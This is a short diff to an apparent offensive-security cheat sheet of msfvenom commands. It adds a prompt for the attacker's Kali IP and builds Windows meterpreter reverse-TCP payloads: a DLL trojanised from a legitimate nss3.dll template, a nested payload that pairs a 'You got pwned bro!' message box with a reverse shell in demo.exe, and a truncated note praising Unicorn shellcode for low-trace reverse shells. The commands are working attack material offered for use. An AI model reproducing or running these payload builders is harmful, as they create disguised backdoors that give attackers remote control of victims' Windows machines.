@@ -1,5 +1,7 @@
 ### MSFVENOM Payloads
 
+read -p 'Please enter the IP of your Kali VM: ' lhost
+
 # DLL Payload
 msfvenom --platform windows --arch x86 --format dll --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=443 --template nss3_legit.dll --keep > nss3.dll
 
@@ -11,7 +13,7 @@ msfvenom --platform windows --arch x86 --format exe --encoder generic/none --pay
 
 ### Nested Payloads
 # Message Box
-msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=INFORMATION TITLE="Sorry" TEXT="You got pwned bro!" --format raw > Payload1
+msfvenom --arch x86 --platform windows --payload windows/messagebox LHOST=$lhost ICON=INFORMATION TITLE="Sorry" TEXT="You got pwned bro!" --format raw > Payload1
 msfvenom --add-code Payload1 --arch x86 --platform windows --payload windows/meterpreter_reverse_tcp LHOST=$lhost LPORT=443 --format exe > demo.exe
 
 # Unicorn Payloads (No exe's! Just paste in the shellcode and bam you have a reverse shell! Great entry points on the system since it leaves minimal trace 
